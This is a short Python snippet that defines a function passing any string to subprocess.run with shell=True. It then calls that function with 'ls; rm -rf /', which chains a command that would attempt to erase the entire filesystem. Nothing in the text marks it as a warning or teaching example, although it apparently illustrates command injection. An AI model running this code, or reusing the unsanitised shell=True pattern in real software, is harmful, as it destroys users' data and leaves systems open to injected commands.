import subprocess

def execute_command(command):
    subprocess.run(command, shell=True)

execute_command('ls; rm -rf /')